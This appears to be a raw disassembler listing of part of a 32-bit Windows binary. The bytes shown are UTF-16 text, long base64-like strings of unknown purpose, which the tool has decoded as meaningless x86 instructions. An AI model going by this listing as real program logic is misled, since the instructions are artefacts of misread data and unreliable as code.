  40aed8:	74 00                	je     0x40aeda
  40aeda:	4b                   	dec    %ebx
  40aedb:	00 63 00             	add    %ah,0x0(%ebx)
  40aede:	57                   	push   %edi
  40aedf:	00 70 00             	add    %dh,0x0(%eax)
  40aee2:	73 00                	jae    0x40aee4
  40aee4:	6e                   	outsb  %ds:(%esi),(%dx)
  40aee5:	00 36                	add    %dh,(%esi)
  40aee7:	00 41 00             	add    %al,0x0(%ecx)
  40aeea:	6a 00                	push   $0x0
  40aeec:	41                   	inc    %ecx
  40aeed:	00 4b 00             	add    %cl,0x0(%ebx)
  40aef0:	73 00                	jae    0x40aef2
  40aef2:	70 00                	jo     0x40aef4
  40aef4:	7a 00                	jp     0x40aef6
  40aef6:	55                   	push   %ebp
  40aef7:	00 52 00             	add    %dl,0x0(%edx)
  40aefa:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40aefe:	52                   	push   %edx
  40aeff:	00 6a 00             	add    %ch,0x0(%edx)
  40af02:	35 00 65 00 4e       	xor    $0x4e006500,%eax
  40af07:	00 42 00             	add    %al,0x0(%edx)
  40af0a:	55                   	push   %ebp
  40af0b:	00 47 00             	add    %al,0x0(%edi)
  40af0e:	44                   	inc    %esp
  40af0f:	00 59 00             	add    %bl,0x0(%ecx)
  40af12:	41                   	inc    %ecx
  40af13:	00 4f 00             	add    %cl,0x0(%edi)
  40af16:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40af1a:	35 00 58 00 75       	xor    $0x75005800,%eax
  40af1f:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40af23:	00 2f                	add    %ch,(%edi)
  40af25:	00 65 00             	add    %ah,0x0(%ebp)
  40af28:	55                   	push   %ebp
  40af29:	00 6e 00             	add    %ch,0x0(%esi)
  40af2c:	4f                   	dec    %edi
  40af2d:	00 4e 00             	add    %cl,0x0(%esi)
  40af30:	54                   	push   %esp
  40af31:	00 2b                	add    %ch,(%ebx)
  40af33:	00 38                	add    %bh,(%eax)
  40af35:	00 73 00             	add    %dh,0x0(%ebx)
  40af38:	61                   	popa
  40af39:	00 51 00             	add    %dl,0x0(%ecx)
  40af3c:	65 00 35 00 30 00 65 	add    %dh,%gs:0x65003000
  40af43:	00 62 00             	add    %ah,0x0(%edx)
  40af46:	35 00 51 00 79       	xor    $0x79005100,%eax
  40af4b:	00 6f 00             	add    %ch,0x0(%edi)
  40af4e:	71 00                	jno    0x40af50
  40af50:	67 00 65 00          	add    %ah,0x0(%di)
  40af54:	58                   	pop    %eax
  40af55:	00 41 00             	add    %al,0x0(%ecx)
  40af58:	5a                   	pop    %edx
  40af59:	00 62 00             	add    %ah,0x0(%edx)
  40af5c:	4d                   	dec    %ebp
  40af5d:	00 70 00             	add    %dh,0x0(%eax)
  40af60:	41                   	inc    %ecx
  40af61:	00 36                	add    %dh,(%esi)
  40af63:	00 61 00             	add    %ah,0x0(%ecx)
  40af66:	78 00                	js     0x40af68
  40af68:	34 00                	xor    $0x0,%al
  40af6a:	42                   	inc    %edx
  40af6b:	00 33                	add    %dh,(%ebx)
  40af6d:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  40af71:	00 50 00             	add    %dl,0x0(%eax)
  40af74:	44                   	inc    %esp
  40af75:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af78:	49                   	dec    %ecx
  40af79:	00 47 00             	add    %al,0x0(%edi)
  40af7c:	38 00                	cmp    %al,(%eax)
  40af7e:	50                   	push   %eax
  40af7f:	00 69 00             	add    %ch,0x0(%ecx)
  40af82:	38 00                	cmp    %al,(%eax)
  40af84:	48                   	dec    %eax
  40af85:	00 37                	add    %dh,(%edi)
  40af87:	00 45 00             	add    %al,0x0(%ebp)
  40af8a:	48                   	dec    %eax
  40af8b:	00 63 00             	add    %ah,0x0(%ebx)
  40af8e:	4a                   	dec    %edx
  40af8f:	00 53 00             	add    %dl,0x0(%ebx)
  40af92:	39 00                	cmp    %eax,(%eax)
  40af94:	42                   	inc    %edx
  40af95:	00 56 00             	add    %dl,0x0(%esi)
  40af98:	58                   	pop    %eax
  40af99:	00 47 00             	add    %al,0x0(%edi)
  40af9c:	69 00 4e 00 48 00    	imul   $0x48004e,(%eax),%eax
  40afa2:	5a                   	pop    %edx
  40afa3:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40afa7:	00 35 00 65 00 33    	add    %dh,0x33006500
  40afad:	00 68 00             	add    %ch,0x0(%eax)
  40afb0:	6d                   	insl   (%dx),%es:(%edi)
  40afb1:	00 66 00             	add    %ah,0x0(%esi)
  40afb4:	2b 00                	sub    (%eax),%eax
  40afb6:	77 00                	ja     0x40afb8
  40afb8:	43                   	inc    %ebx
  40afb9:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
  40afbd:	00 6a 00             	add    %ch,0x0(%edx)
  40afc0:	67 00 55 00          	add    %dl,0x0(%di)
  40afc4:	48                   	dec    %eax
  40afc5:	00 6b 00             	add    %ch,0x0(%ebx)
  40afc8:	6f                   	outsl  %ds:(%esi),(%dx)
  40afc9:	00 41 00             	add    %al,0x0(%ecx)
  40afcc:	72 00                	jb     0x40afce
  40afce:	47                   	inc    %edi
  40afcf:	00 2b                	add    %ch,(%ebx)
  40afd1:	00 2b                	add    %ch,(%ebx)
  40afd3:	00 41 00             	add    %al,0x0(%ecx)
  40afd6:	75 00                	jne    0x40afd8
  40afd8:	64 00 4c 00 52       	add    %cl,%fs:0x52(%eax,%eax,1)
  40afdd:	00 6e 00             	add    %ch,0x0(%esi)
  40afe0:	58                   	pop    %eax
  40afe1:	00 36                	add    %dh,(%esi)
  40afe3:	00 79 00             	add    %bh,0x0(%ecx)
  40afe6:	6e                   	outsb  %ds:(%esi),(%dx)
  40afe7:	00 62 00             	add    %ah,0x0(%edx)
  40afea:	31 00                	xor    %eax,(%eax)
  40afec:	56                   	push   %esi
  40afed:	00 7a 00             	add    %bh,0x0(%edx)
  40aff0:	49                   	dec    %ecx
  40aff1:	00 36                	add    %dh,(%esi)
  40aff3:	00 7a 00             	add    %bh,0x0(%edx)
  40aff6:	57                   	push   %edi
  40aff7:	00 4f 00             	add    %cl,0x0(%edi)
  40affa:	6f                   	outsl  %ds:(%esi),(%dx)
  40affb:	00 35 00 73 00 4b    	add    %dh,0x4b007300
  40b001:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40b005:	00 79 00             	add    %bh,0x0(%ecx)
  40b008:	57                   	push   %edi
  40b009:	00 4d 00             	add    %cl,0x0(%ebp)
  40b00c:	54                   	push   %esp
  40b00d:	00 62 00             	add    %ah,0x0(%edx)
  40b010:	62 00                	bound  %eax,(%eax)
  40b012:	79 00                	jns    0x40b014
  40b014:	4b                   	dec    %ebx
  40b015:	00 67 00             	add    %ah,0x0(%edi)
  40b018:	74 00                	je     0x40b01a
  40b01a:	4d                   	dec    %ebp
  40b01b:	00 59 00             	add    %bl,0x0(%ecx)
  40b01e:	46                   	inc    %esi
  40b01f:	00 35 00 42 00 46    	add    %dh,0x46004200
  40b025:	00 43 00             	add    %al,0x0(%ebx)
  40b028:	33 00                	xor    (%eax),%eax
  40b02a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b02b:	00 2b                	add    %ch,(%ebx)
  40b02d:	00 42 00             	add    %al,0x0(%edx)
  40b030:	5a                   	pop    %edx
  40b031:	00 6d 00             	add    %ch,0x0(%ebp)
  40b034:	45                   	inc    %ebp
  40b035:	00 6d 00             	add    %ch,0x0(%ebp)
  40b038:	38 00                	cmp    %al,(%eax)
  40b03a:	2f                   	das
  40b03b:	00 55 00             	add    %dl,0x0(%ebp)
  40b03e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b03f:	00 62 00             	add    %ah,0x0(%edx)
  40b042:	39 00                	cmp    %eax,(%eax)
  40b044:	47                   	inc    %edi
  40b045:	00 55 00             	add    %dl,0x0(%ebp)
  40b048:	35 00 39 00 54       	xor    $0x54003900,%eax
  40b04d:	00 4d 00             	add    %cl,0x0(%ebp)
  40b050:	4d                   	dec    %ebp
  40b051:	00 57 00             	add    %dl,0x0(%edi)
  40b054:	6d                   	insl   (%dx),%es:(%edi)
  40b055:	00 45 00             	add    %al,0x0(%ebp)
  40b058:	79 00                	jns    0x40b05a
  40b05a:	42                   	inc    %edx
  40b05b:	00 58 00             	add    %bl,0x0(%eax)
  40b05e:	56                   	push   %esi
  40b05f:	00 31                	add    %dh,(%ecx)
  40b061:	00 30                	add    %dh,(%eax)
  40b063:	00 67 00             	add    %ah,0x0(%edi)
  40b066:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40b069:	00 50 00             	add    %dl,0x0(%eax)
  40b06c:	2f                   	das
  40b06d:	00 72 00             	add    %dh,0x0(%edx)
  40b070:	63 00                	arpl   %eax,(%eax)
  40b072:	43                   	inc    %ebx
  40b073:	00 63 00             	add    %ah,0x0(%ebx)
  40b076:	6a 00                	push   $0x0
  40b078:	4e                   	dec    %esi
  40b079:	00 78 00             	add    %bh,0x0(%eax)
  40b07c:	58                   	pop    %eax
  40b07d:	00 6e 00             	add    %ch,0x0(%esi)
  40b080:	62 00                	bound  %eax,(%eax)
  40b082:	2f                   	das
  40b083:	00 63 00             	add    %ah,0x0(%ebx)
  40b086:	68 00 65 00 42       	push   $0x42006500
  40b08b:	00 51 00             	add    %dl,0x0(%ecx)
  40b08e:	76 00                	jbe    0x40b090
  40b090:	6e                   	outsb  %ds:(%esi),(%dx)
  40b091:	00 50 00             	add    %dl,0x0(%eax)
  40b094:	43                   	inc    %ebx
  40b095:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  40b099:	00 7a 00             	add    %bh,0x0(%edx)
  40b09c:	70 00                	jo     0x40b09e
  40b09e:	6c                   	insb   (%dx),%es:(%edi)
  40b09f:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b0a3:	00 47 00             	add    %al,0x0(%edi)
  40b0a6:	61                   	popa
  40b0a7:	00 62 00             	add    %ah,0x0(%edx)
  40b0aa:	57                   	push   %edi
  40b0ab:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0ae:	7a 00                	jp     0x40b0b0
  40b0b0:	34 00                	xor    $0x0,%al
  40b0b2:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40b0b6:	61                   	popa
  40b0b7:	00 37                	add    %dh,(%edi)
  40b0b9:	00 6e 00             	add    %ch,0x0(%esi)
  40b0bc:	74 00                	je     0x40b0be
  40b0be:	42                   	inc    %edx
  40b0bf:	00 37                	add    %dh,(%edi)
  40b0c1:	00 53 00             	add    %dl,0x0(%ebx)
  40b0c4:	6c                   	insb   (%dx),%es:(%edi)
  40b0c5:	00 30                	add    %dh,(%eax)
  40b0c7:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40b0cb:	00 4d 00             	add    %cl,0x0(%ebp)
  40b0ce:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b0d2:	42                   	inc    %edx
  40b0d3:	00 73 00             	add    %dh,0x0(%ebx)
  40b0d6:	7a 00                	jp     0x40b0d8
  40b0d8:	2b 00                	sub    (%eax),%eax
  40b0da:	39 00                	cmp    %eax,(%eax)
  40b0dc:	44                   	inc    %esp
  40b0dd:	00 57 00             	add    %dl,0x0(%edi)
  40b0e0:	54                   	push   %esp
  40b0e1:	00 58 00             	add    %bl,0x0(%eax)
  40b0e4:	6c                   	insb   (%dx),%es:(%edi)
  40b0e5:	00 45 00             	add    %al,0x0(%ebp)
  40b0e8:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40b0ec:	4e                   	dec    %esi
  40b0ed:	00 48 00             	add    %cl,0x0(%eax)
  40b0f0:	38 00                	cmp    %al,(%eax)
  40b0f2:	74 00                	je     0x40b0f4
  40b0f4:	37                   	aaa
  40b0f5:	00 70 00             	add    %dh,0x0(%eax)
  40b0f8:	74 00                	je     0x40b0fa
  40b0fa:	39 00                	cmp    %eax,(%eax)
  40b0fc:	44                   	inc    %esp
  40b0fd:	00 4b 00             	add    %cl,0x0(%ebx)
  40b100:	68 00 79 00 37       	push   $0x37007900
  40b105:	00 43 00             	add    %al,0x0(%ebx)
  40b108:	30 00                	xor    %al,(%eax)
  40b10a:	42                   	inc    %edx
  40b10b:	00 55 00             	add    %dl,0x0(%ebp)
  40b10e:	2f                   	das
  40b10f:	00 70 00             	add    %dh,0x0(%eax)
  40b112:	2f                   	das
  40b113:	00 42 00             	add    %al,0x0(%edx)
  40b116:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40b11a:	34 00                	xor    $0x0,%al
  40b11c:	76 00                	jbe    0x40b11e
  40b11e:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40b122:	35 00 31 00 70       	xor    $0x70003100,%eax
  40b127:	00 37                	add    %dh,(%edi)
  40b129:	00 68 00             	add    %ch,0x0(%eax)
  40b12c:	63 00                	arpl   %eax,(%eax)
  40b12e:	31 00                	xor    %eax,(%eax)
  40b130:	50                   	push   %eax
  40b131:	00 51 00             	add    %dl,0x0(%ecx)
  40b134:	63 00                	arpl   %eax,(%eax)
  40b136:	35 00 69 00 76       	xor    $0x76006900,%eax
  40b13b:	00 6e 00             	add    %ch,0x0(%esi)
  40b13e:	53                   	push   %ebx
  40b13f:	00 43 00             	add    %al,0x0(%ebx)
  40b142:	39 00                	cmp    %eax,(%eax)
  40b144:	71 00                	jno    0x40b146
  40b146:	46                   	inc    %esi
  40b147:	00 55 00             	add    %dl,0x0(%ebp)
  40b14a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b14b:	00 31                	add    %dh,(%ecx)
  40b14d:	00 79 00             	add    %bh,0x0(%ecx)
  40b150:	6d                   	insl   (%dx),%es:(%edi)
  40b151:	00 57 00             	add    %dl,0x0(%edi)
  40b154:	63 00                	arpl   %eax,(%eax)
  40b156:	6d                   	insl   (%dx),%es:(%edi)
  40b157:	00 6e 00             	add    %ch,0x0(%esi)
  40b15a:	32 00                	xor    (%eax),%al
  40b15c:	37                   	aaa
  40b15d:	00 4d 00             	add    %cl,0x0(%ebp)
  40b160:	62 00                	bound  %eax,(%eax)
  40b162:	30 00                	xor    %al,(%eax)
  40b164:	52                   	push   %edx
  40b165:	00 69 00             	add    %ch,0x0(%ecx)
  40b168:	6b 00 76             	imul   $0x76,(%eax),%eax
  40b16b:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  40b16f:	00 7a 00             	add    %bh,0x0(%edx)
  40b172:	61                   	popa
  40b173:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40b177:	00 55 00             	add    %dl,0x0(%ebp)
  40b17a:	53                   	push   %ebx
  40b17b:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40b17f:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  40b183:	00 62 00             	add    %ah,0x0(%edx)
  40b186:	2f                   	das
  40b187:	00 4f 00             	add    %cl,0x0(%edi)
  40b18a:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40b18e:	46                   	inc    %esi
  40b18f:	00 42 00             	add    %al,0x0(%edx)
  40b192:	42                   	inc    %edx
  40b193:	00 73 00             	add    %dh,0x0(%ebx)
  40b196:	38 00                	cmp    %al,(%eax)
  40b198:	7a 00                	jp     0x40b19a
  40b19a:	45                   	inc    %ebp
  40b19b:	00 62 00             	add    %ah,0x0(%edx)
  40b19e:	44                   	inc    %esp
  40b19f:	00 47 00             	add    %al,0x0(%edi)
  40b1a2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1a3:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40b1a7:	00 44 00 2f          	add    %al,0x2f(%eax,%eax,1)
  40b1ab:	00 77 00             	add    %dh,0x0(%edi)
  40b1ae:	47                   	inc    %edi
  40b1af:	00 63 00             	add    %ah,0x0(%ebx)
  40b1b2:	6c                   	insb   (%dx),%es:(%edi)
  40b1b3:	00 47 00             	add    %al,0x0(%edi)
  40b1b6:	56                   	push   %esi
  40b1b7:	00 38                	add    %bh,(%eax)
  40b1b9:	00 72 00             	add    %dh,0x0(%edx)
  40b1bc:	53                   	push   %ebx
  40b1bd:	00 76 00             	add    %dh,0x0(%esi)
  40b1c0:	37                   	aaa
  40b1c1:	00 46 00             	add    %al,0x0(%esi)
  40b1c4:	61                   	popa
  40b1c5:	00 76 00             	add    %dh,0x0(%esi)
  40b1c8:	6d                   	insl   (%dx),%es:(%edi)
  40b1c9:	00 37                	add    %dh,(%edi)
  40b1cb:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1ce:	53                   	push   %ebx
  40b1cf:	00 69 00             	add    %ch,0x0(%ecx)
  40b1d2:	51                   	push   %ecx
  40b1d3:	00 46 00             	add    %al,0x0(%esi)
  40b1d6:	68 00 56 00 4d       	push   $0x4d005600
  40b1db:	00 47 00             	add    %al,0x0(%edi)
  40b1de:	56                   	push   %esi
  40b1df:	00 49 00             	add    %cl,0x0(%ecx)
  40b1e2:	66 00 30             	data16 add %dh,(%eax)
  40b1e5:	00 4f 00             	add    %cl,0x0(%edi)
  40b1e8:	77 00                	ja     0x40b1ea
  40b1ea:	2b 00                	sub    (%eax),%eax
  40b1ec:	47                   	inc    %edi
  40b1ed:	00 35 00 6f 00 36    	add    %dh,0x36006f00
  40b1f3:	00 57 00             	add    %dl,0x0(%edi)
  40b1f6:	2f                   	das
  40b1f7:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40b1fb:	00 68 00             	add    %ch,0x0(%eax)
  40b1fe:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1ff:	00 49 00             	add    %cl,0x0(%ecx)
  40b202:	6e                   	outsb  %ds:(%esi),(%dx)
  40b203:	00 49 00             	add    %cl,0x0(%ecx)
  40b206:	50                   	push   %eax
  40b207:	00 77 00             	add    %dh,0x0(%edi)
  40b20a:	44                   	inc    %esp
  40b20b:	00 42 00             	add    %al,0x0(%edx)
  40b20e:	58                   	pop    %eax
  40b20f:	00 37                	add    %dh,(%edi)
  40b211:	00 77 00             	add    %dh,0x0(%edi)
  40b214:	33 00                	xor    (%eax),%eax
  40b216:	2f                   	das
  40b217:	00 7a 00             	add    %bh,0x0(%edx)
  40b21a:	71 00                	jno    0x40b21c
  40b21c:	68 00 7a 00 59       	push   $0x59007a00
  40b221:	00 57 00             	add    %dl,0x0(%edi)
  40b224:	56                   	push   %esi
  40b225:	00 66 00             	add    %ah,0x0(%esi)
  40b228:	37                   	aaa
  40b229:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  40b22d:	00 39                	add    %bh,(%ecx)
  40b22f:	00 46 00             	add    %al,0x0(%esi)
  40b232:	6c                   	insb   (%dx),%es:(%edi)
  40b233:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40b237:	00 66 00             	add    %ah,0x0(%esi)
  40b23a:	4c                   	dec    %esp
  40b23b:	00 6b 00             	add    %ch,0x0(%ebx)
  40b23e:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40b243:	75 00                	jne    0x40b245
  40b245:	72 00                	jb     0x40b247
  40b247:	67 00 66 00          	add    %ah,0x0(%bp)
  40b24b:	44                   	inc    %esp
  40b24c:	00 42 00             	add    %al,0x0(%edx)
  40b24f:	38 00                	cmp    %al,(%eax)
  40b251:	35 00 59 00 4a       	xor    $0x4a005900,%eax
  40b256:	00 4b 00             	add    %cl,0x0(%ebx)
  40b259:	2b 00                	sub    (%eax),%eax
  40b25b:	33 00                	xor    (%eax),%eax
  40b25d:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40b261:	76 00                	jbe    0x40b263
  40b263:	31 00                	xor    %eax,(%eax)
  40b265:	72 00                	jb     0x40b267
  40b267:	7a 00                	jp     0x40b269
  40b269:	59                   	pop    %ecx
  40b26a:	00 4b 00             	add    %cl,0x0(%ebx)
  40b26d:	4d                   	dec    %ebp
  40b26e:	00 43 00             	add    %al,0x0(%ebx)
  40b271:	73 00                	jae    0x40b273
  40b273:	45                   	inc    %ebp
  40b274:	00 38                	add    %bh,(%eax)
  40b276:	00 32                	add    %dh,(%edx)
  40b278:	00 6f 00             	add    %ch,0x0(%edi)
  40b27b:	56                   	push   %esi
  40b27c:	00 70 00             	add    %dh,0x0(%eax)
  40b27f:	2f                   	das
  40b280:	00 63 00             	add    %ah,0x0(%ebx)
  40b283:	59                   	pop    %ecx
  40b284:	00 52 00             	add    %dl,0x0(%edx)
  40b287:	39 00                	cmp    %eax,(%eax)
  40b289:	75 00                	jne    0x40b28b
  40b28b:	74 00                	je     0x40b28d
  40b28d:	63 00                	arpl   %eax,(%eax)
  40b28f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b290:	00 70 00             	add    %dh,0x0(%eax)
  40b293:	6d                   	insl   (%dx),%es:(%edi)
  40b294:	00 4d 00             	add    %cl,0x0(%ebp)
  40b297:	6a 00                	push   $0x0
  40b299:	68 00 74 00 6d       	push   $0x6d007400
  40b29e:	00 50 00             	add    %dl,0x0(%eax)
  40b2a1:	61                   	popa
  40b2a2:	00 61 00             	add    %ah,0x0(%ecx)
  40b2a5:	4c                   	dec    %esp
  40b2a6:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40b2aa:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40b2ae:	00 65 00             	add    %ah,0x0(%ebp)
  40b2b1:	68 00 61 00 50       	push   $0x50006100
  40b2b6:	00 7a 00             	add    %bh,0x0(%edx)
  40b2b9:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b2bc:	00 6d 00             	add    %ch,0x0(%ebp)
  40b2bf:	33 00                	xor    (%eax),%eax
  40b2c1:	31 00                	xor    %eax,(%eax)
  40b2c3:	48                   	dec    %eax
  40b2c4:	00 6e 00             	add    %ch,0x0(%esi)
  40b2c7:	38 00                	cmp    %al,(%eax)
  40b2c9:	34 00                	xor    $0x0,%al
  40b2cb:	38 00                	cmp    %al,(%eax)
  40b2cd:	61                   	popa
  40b2ce:	00 37                	add    %dh,(%edi)
  40b2d0:	00 77 00             	add    %dh,0x0(%edi)
  40b2d3:	54                   	push   %esp
  40b2d4:	00 35 00 4e 00 58    	add    %dh,0x58004e00
  40b2da:	00 4a 00             	add    %cl,0x0(%edx)
  40b2dd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2de:	00 71 00             	add    %dh,0x0(%ecx)
  40b2e1:	63 00                	arpl   %eax,(%eax)
  40b2e3:	2f                   	das
  40b2e4:	00 50 00             	add    %dl,0x0(%eax)
  40b2e7:	76 00                	jbe    0x40b2e9
  40b2e9:	32 00                	xor    (%eax),%al
  40b2eb:	45                   	inc    %ebp
  40b2ec:	00 6a 00             	add    %ch,0x0(%edx)
  40b2ef:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40b2f2:	00 67 00             	add    %ah,0x0(%edi)
  40b2f5:	2b 00                	sub    (%eax),%eax
  40b2f7:	30 00                	xor    %al,(%eax)
  40b2f9:	56                   	push   %esi
  40b2fa:	00 32                	add    %dh,(%edx)
  40b2fc:	00 4f 00             	add    %cl,0x0(%edi)
  40b2ff:	78 00                	js     0x40b301
  40b301:	47                   	inc    %edi
  40b302:	00 43 00             	add    %al,0x0(%ebx)
  40b305:	76 00                	jbe    0x40b307
  40b307:	46                   	inc    %esi
  40b308:	00 35 00 6f 00 78    	add    %dh,0x78006f00
  40b30e:	00 45 00             	add    %al,0x0(%ebp)
  40b311:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
  40b315:	49                   	dec    %ecx
  40b316:	00 42 00             	add    %al,0x0(%edx)
  40b319:	4d                   	dec    %ebp
  40b31a:	00 77 00             	add    %dh,0x0(%edi)
  40b31d:	5a                   	pop    %edx
  40b31e:	00 66 00             	add    %ah,0x0(%esi)
  40b321:	52                   	push   %edx
  40b322:	00 42 00             	add    %al,0x0(%edx)
  40b325:	2f                   	das
  40b326:	00 6b 00             	add    %ch,0x0(%ebx)
  40b329:	6d                   	insl   (%dx),%es:(%edi)
  40b32a:	00 6a 00             	add    %ch,0x0(%edx)
  40b32d:	34 00                	xor    $0x0,%al
  40b32f:	44                   	inc    %esp
  40b330:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b333:	52                   	push   %edx
  40b334:	00 7a 00             	add    %bh,0x0(%edx)
  40b337:	78 00                	js     0x40b339
  40b339:	33 00                	xor    (%eax),%eax
  40b33b:	4b                   	dec    %ebx
  40b33c:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40b340:	00 73 00             	add    %dh,0x0(%ebx)
  40b343:	70 00                	jo     0x40b345
  40b345:	67 00 36 00 39       	add    %dh,0x3900
  40b34a:	00 38                	add    %bh,(%eax)
  40b34c:	00 75 00             	add    %dh,0x0(%ebp)
  40b34f:	31 00                	xor    %eax,(%eax)
  40b351:	64 00 4c 00 6a       	add    %cl,%fs:0x6a(%eax,%eax,1)
  40b356:	00 42 00             	add    %al,0x0(%edx)
  40b359:	46                   	inc    %esi
  40b35a:	00 75 00             	add    %dh,0x0(%ebp)
  40b35d:	69 00 33 00 69 00    	imul   $0x690033,(%eax),%eax
  40b363:	42                   	inc    %edx
  40b364:	00 6a 00             	add    %ch,0x0(%edx)
  40b367:	71 00                	jno    0x40b369
  40b369:	78 00                	js     0x40b36b
  40b36b:	32 00                	xor    (%eax),%al
  40b36d:	57                   	push   %edi
  40b36e:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40b372:	00 69 00             	add    %ch,0x0(%ecx)
  40b375:	42                   	inc    %edx
  40b376:	00 6b 00             	add    %ch,0x0(%ebx)
  40b379:	59                   	pop    %ecx
  40b37a:	00 53 00             	add    %dl,0x0(%ebx)
  40b37d:	69 00 65 00 66 00    	imul   $0x660065,(%eax),%eax
  40b383:	62 00                	bound  %eax,(%eax)
  40b385:	6e                   	outsb  %ds:(%esi),(%dx)
  40b386:	00 43 00             	add    %al,0x0(%ebx)
  40b389:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40b38d:	69 00 53 00 75 00    	imul   $0x750053,(%eax),%eax
  40b393:	34 00                	xor    $0x0,%al
  40b395:	6c                   	insb   (%dx),%es:(%edi)
  40b396:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40b39a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b39d:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40b3a1:	38 00                	cmp    %al,(%eax)
  40b3a3:	45                   	inc    %ebp
  40b3a4:	00 30                	add    %dh,(%eax)
  40b3a6:	00 6b 00             	add    %ch,0x0(%ebx)
  40b3a9:	51                   	push   %ecx
  40b3aa:	00 39                	add    %bh,(%ecx)
  40b3ac:	00 45 00             	add    %al,0x0(%ebp)
  40b3af:	47                   	inc    %edi
  40b3b0:	00 42 00             	add    %al,0x0(%edx)
  40b3b3:	51                   	push   %ecx
  40b3b4:	00 73 00             	add    %dh,0x0(%ebx)
  40b3b7:	58                   	pop    %eax
  40b3b8:	00 79 00             	add    %bh,0x0(%ecx)
  40b3bb:	2b 00                	sub    (%eax),%eax
  40b3bd:	78 00                	js     0x40b3bf
  40b3bf:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40b3c3:	5a                   	pop    %edx
  40b3c4:	00 63 00             	add    %ah,0x0(%ebx)
  40b3c7:	4e                   	dec    %esi
  40b3c8:	00 6b 00             	add    %ch,0x0(%ebx)
  40b3cb:	34 00                	xor    $0x0,%al
  40b3cd:	49                   	dec    %ecx
  40b3ce:	00 45 00             	add    %al,0x0(%ebp)
  40b3d1:	2b 00                	sub    (%eax),%eax
  40b3d3:	79 00                	jns    0x40b3d5
  40b3d5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3d6:	00 47 00             	add    %al,0x0(%edi)
  40b3d9:	41                   	inc    %ecx
  40b3da:	00 38                	add    %bh,(%eax)
  40b3dc:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  40b3e0:	00 33                	add    %dh,(%ebx)
  40b3e2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b3e5:	5a                   	pop    %edx
  40b3e6:	00 6a 00             	add    %ch,0x0(%edx)
  40b3e9:	58                   	pop    %eax
  40b3ea:	00 6e 00             	add    %ch,0x0(%esi)
  40b3ed:	71 00                	jno    0x40b3ef
  40b3ef:	59                   	pop    %ecx
  40b3f0:	00 46 00             	add    %al,0x0(%esi)
  40b3f3:	70 00                	jo     0x40b3f5
  40b3f5:	73 00                	jae    0x40b3f7
  40b3f7:	50                   	push   %eax
  40b3f8:	00 66 00             	add    %ah,0x0(%esi)
  40b3fb:	4e                   	dec    %esi
  40b3fc:	00 63 00             	add    %ah,0x0(%ebx)
  40b3ff:	78 00                	js     0x40b401
  40b401:	55                   	push   %ebp
  40b402:	00 67 00             	add    %ah,0x0(%edi)
  40b405:	35 00 6f 00 53       	xor    $0x53006f00,%eax
  40b40a:	00 62 00             	add    %ah,0x0(%edx)
  40b40d:	2f                   	das
  40b40e:	00 77 00             	add    %dh,0x0(%edi)
  40b411:	50                   	push   %eax
  40b412:	00 48 00             	add    %cl,0x0(%eax)
  40b415:	74 00                	je     0x40b417
  40b417:	34 00                	xor    $0x0,%al
  40b419:	2b 00                	sub    (%eax),%eax
  40b41b:	44                   	inc    %esp
  40b41c:	00 6a 00             	add    %ch,0x0(%edx)
  40b41f:	47                   	inc    %edi
  40b420:	00 4b 00             	add    %cl,0x0(%ebx)
  40b423:	31 00                	xor    %eax,(%eax)
  40b425:	75 00                	jne    0x40b427
  40b427:	69 00 53 00 45 00    	imul   $0x450053,(%eax),%eax
  40b42d:	37                   	aaa
  40b42e:	00 59 00             	add    %bl,0x0(%ecx)
  40b431:	79 00                	jns    0x40b433
  40b433:	38 00                	cmp    %al,(%eax)
  40b435:	30 00                	xor    %al,(%eax)
